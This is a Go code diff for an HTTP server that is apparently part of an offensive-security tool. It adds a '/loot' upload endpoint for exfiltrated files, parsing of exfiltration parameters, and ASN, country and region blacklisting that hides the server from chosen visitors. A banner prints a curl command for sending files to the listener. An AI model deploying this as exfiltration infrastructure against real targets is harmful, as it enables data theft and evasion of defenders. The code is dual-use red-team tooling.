@@ -11,9 +11,11 @@ import (
 	"net"
 	"net/http"
 	"net/url"
+	"regexp"
 	"strings"
 	"unicode"
 
+	"github.com/driftsec/getasn"
 	"github.com/gorilla/mux"
 	"github.com/projectdiscovery/sslcert"
 )
@@ -34,10 +36,11 @@ const (
 
 type HTTPConfig struct {
 	Dump            bool
-	WorkDir         string
-	DoAuth          bool
-	Username        string
-	Password        string
+	ServeDir        string
+	NoLoot          bool
+	LootDir         string
+	LootAuth        string
+	Auth            string
 	RedirectURL     string
 	Addr            string
 	Port            string
@@ -54,6 +57,7 @@ type HTTPConfig struct {
 	ctx             *context.Context
 	router          *mux.Router
 	Running         bool
+	Blacklist       []string
 }
 
 // var HttpCfg HTTPConfig
@@ -65,27 +69,69 @@ func New() *HTTPConfig {
 	return ret
 }
 
-func (hc *HTTPConfig) CheckAuth(r *http.Request) bool {
-	if !hc.DoAuth {
-		return true
+func (hc *HTTPConfig) Blacklisted(req *http.Request) (bool, *getasn.IPInfo) {
+	ipinfo, err := getasn.GetASN(strings.Split(req.RemoteAddr, ":")[0])
+	if len(hc.Blacklist) == 0 {
+		return false, ipinfo
 	}
 
+	if err != nil {
+		log.Println("[ERROR] ipinfo.io:", err)
+	}
+	for _, regx := range hc.Blacklist {
+		if regx == "" {
+			continue
+		}
+		r, err := regexp.Compile(regx)
+		if err != nil {
+			log.Println("[ERROR] blacklist regex", regx+":", err)
+		}
+		if r.MatchString(ipinfo.Org) {
+			log.Println("HTTP/s Blacklist ASN:", regx, ">>", ipinfo.Org)
+			return true, ipinfo
+		}
+		if r.MatchString(ipinfo.Region) {
+			log.Println("HTTP/s Blacklist Region:", regx, ">>", ipinfo.Region)
+			return true, ipinfo
+		}
+		if r.MatchString(ipinfo.Country) {
+			log.Println("HTTP/s Blacklist Country:", regx, ">>", ipinfo.Country)
+			return true, ipinfo
+		}
+		if r.MatchString(req.RemoteAddr) {
+			log.Println("HTTP/s Blacklist RemoteAddr:", regx, ">>", req.RemoteAddr)
+			return true, ipinfo
+		}
+	}
+	return false, ipinfo
+}
+
+func (hc *HTTPConfig) CheckAuth(r *http.Request, auth string) bool {
+	if auth == "" {
+		return true
+	}
+	tmp := strings.SplitN(hc.Auth, ":", 2)
+	username := tmp[0]
+	password := tmp[1]
 	u, p, ok := r.BasicAuth()
 	if !ok {
 		return false
 	}
-	if u != hc.Username {
+	if u != username {
 		return false
 	}
-	if p != hc.Password {
+	if p != password {
 		return false
 	}
 	return true
 }
 
 func (hc *HTTPConfig) DropLoot(w http.ResponseWriter, r *http.Request) {
-	auth := hc.CheckAuth(r)
-	hc.DumpReq(w, r, auth)
+	if hc.NoLoot {
+		return
+	}
+	auth := hc.CheckAuth(r, hc.LootAuth)
+	// hc.DumpReq(w, r, auth)
 	hc.LogRequest(r)
 	if !auth {
 		return
@@ -106,17 +152,17 @@ func (hc *HTTPConfig) DropLoot(w http.ResponseWriter, r *http.Request) {
 		fmt.Println(err)
 	}
 
-	err = ioutil.WriteFile(hc.WorkDir+"/"+handler.Filename, fileBytes, 0644)
+	err = ioutil.WriteFile(hc.LootDir+"/"+handler.Filename, fileBytes, 0644)
 	if err != nil {
-		fmt.Println(Red+"[ERROR] Failed to write local file:", hc.WorkDir+"/"+handler.Filename, Reset)
+		fmt.Println(Red+"[ERROR] Failed to write local file:", hc.LootDir+"/"+handler.Filename, Reset)
 		return
 	}
 	fmt.Println(Green+"[+] Uploaded File:", handler.Filename, Reset)
 }
 
-func (hc *HTTPConfig) DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
+func (hc *HTTPConfig) DumpReq(w http.ResponseWriter, req *http.Request, auth bool, ipinfo *getasn.IPInfo) {
 	authmsg := ""
-	if hc.DoAuth {
+	if hc.Auth != "" {
 		if auth {
 			authmsg = Green + "(Auth Valid)" + Reset
 		} else {
@@ -126,7 +172,11 @@ func (hc *HTTPConfig) DumpReq(w http.ResponseWriter, req *http.Request, auth boo
 	}
 	exmsg := ""
 	exfil := hc.parseExfil(req)
-	log.Println(req.Method, "from", req.RemoteAddr+":", req.URL.Path, authmsg, exmsg)
+	scheme := "HTTP:"
+	if hc.SSL {
+		scheme = "HTTPS:"
+	}
+	log.Println(scheme, req.Method, "from", req.RemoteAddr, "(ASN: "+ipinfo.Org+"):", req.URL.Path, authmsg, exmsg)
 	if len(exfil) > 0 {
 		tmp := []string{}
 		for k, v := range exfil {
@@ -282,52 +332,61 @@ func isASCII(s string) bool {
 	}
 	return true
 }
+
 func (hc *HTTPConfig) ServeFiles(h http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		auth := hc.CheckAuth(r)
-		hc.DumpReq(w, r, auth)
-		hc.LogRequest(r)
-		if !auth {
-			return
-		}
-		for k, v := range hc.Headers {
-			w.Header().Add(k, v)
-		}
+		blk, ipinf := hc.Blacklisted(r)
+		if !blk {
+			auth := hc.CheckAuth(r, hc.Auth)
+			hc.DumpReq(w, r, auth, ipinf)
+			hc.LogRequest(r)
+			if !auth {
+				return
+			}
+			for k, v := range hc.Headers {
+				w.Header().Add(k, v)
+			}
 
-		h.ServeHTTP(w, r) // call original
+			h.ServeHTTP(w, r) // call original
+		}
 	})
 }
-
 func (hc *HTTPConfig) ServeRedir(w http.ResponseWriter, r *http.Request) {
-	auth := hc.CheckAuth(r)
-	hc.DumpReq(w, r, auth)
-	hc.LogRequest(r)
-	http.Redirect(w, r, hc.RedirectURL, http.StatusSeeOther)
+	blk, ipinf := hc.Blacklisted(r)
+	if !blk {
+		auth := hc.CheckAuth(r, hc.Auth)
+		hc.DumpReq(w, r, auth, ipinf)
+		hc.LogRequest(r)
+		http.Redirect(w, r, hc.RedirectURL, http.StatusSeeOther)
+	}
 }
 
 func (hc *HTTPConfig) ServeCustom(w http.ResponseWriter, r *http.Request) {
-	auth := hc.CheckAuth(r)
-	hc.DumpReq(w, r, auth)
-	hc.LogRequest(r)
-	log.Println("Request for", r.URL.Path, "reading response from:", hc.CustomResponses[r.URL.Path])
-	f, err := ioutil.ReadFile(hc.CustomResponses[r.URL.Path])
-	if err != nil {
-		log.Fatal("err")
-	}
-
-	prts := strings.SplitN(string(f), "\n\n", 2)
-	for _, h := range strings.Split(prts[0], "\n") {
-		if strings.HasPrefix(h, "HTTP") {
-			continue
+	blk, ipinf := hc.Blacklisted(r)
+	if !blk {
+		auth := hc.CheckAuth(r, hc.Auth)
+		hc.DumpReq(w, r, auth, ipinf)
+		hc.LogRequest(r)
+		log.Println("Request for", r.URL.Path, "reading response from:", hc.CustomResponses[r.URL.Path])
+		f, err := ioutil.ReadFile(hc.CustomResponses[r.URL.Path])
+		if err != nil {
+			log.Fatal("err")
 		}
-		tmp := strings.Replace(h, ": ", ":", -1)
-		kv := strings.SplitN(tmp, ":", 2)
-		w.Header().Set(strings.ToLower(kv[0]), kv[1])
-		//
+
+		prts := strings.SplitN(string(f), "\n\n", 2)
+		for _, h := range strings.Split(prts[0], "\n") {
+			if strings.HasPrefix(h, "HTTP") {
+				continue
+			}
+			tmp := strings.Replace(h, ": ", ":", -1)
+			kv := strings.SplitN(tmp, ":", 2)
+			w.Header().Set(strings.ToLower(kv[0]), kv[1])
+			//
+		}
+		w.Header().Set("content-length", fmt.Sprintf("%d", len(prts[1])))
+		w.WriteHeader(200)       // write status code
+		w.Write([]byte(prts[1])) // write body
 	}
-	w.Header().Set("content-length", fmt.Sprintf("%d", len(prts[1])))
-	w.WriteHeader(200)       // write status code
-	w.Write([]byte(prts[1])) // write body
 }
 
 func (hc *HTTPConfig) ListURLs(addr, port string, ssl bool) {
@@ -361,7 +420,8 @@ func (hc *HTTPConfig) SetupRoutes() {
 	hc.router = mux.NewRouter()
 	hc.router.HandleFunc("/loot", hc.DropLoot)
 	if hc.RedirectURL == "" {
-		hc.router.Handle("/", hc.ServeFiles(http.FileServer(http.Dir(hc.WorkDir))))
+		fs := hc.ServeFiles(http.FileServer(http.Dir(hc.ServeDir)))
+		hc.router.PathPrefix("/").Handler(fs)
 	} else {
 		hc.router.HandleFunc("/", hc.ServeRedir)
 	}
@@ -385,8 +445,8 @@ func (hc *HTTPConfig) Run() {
 		fmt.Println(Blue + "[!] Upload URI: /loot (curl -F \"file=@./file.txt\" http[s]://address:port/loot)" + Reset)
 		fmt.Println(Blue + "[!] Special Params: base64 (GET/POST)" + Reset)
 		fmt.Println(Blue+"[!] Dump Requests:", hc.Dump, Reset)
-		fmt.Println(Blue+"[!] Auth Enabled:", hc.DoAuth, Reset)
-		fmt.Println(Blue+"[!] Working Directory:", hc.WorkDir, Reset)
+		fmt.Println(Blue+"[!] Auth Enabled:", hc.Auth, Reset)
+		fmt.Println(Blue+"[!] Working Directory:", hc.ServeDir, Reset)
 		fmt.Println(Blue+"[!] SSL Enabled:", hc.SSL, Reset)
 		hc.ListURLs(hc.Addr, hc.Port, hc.SSL)
 	}
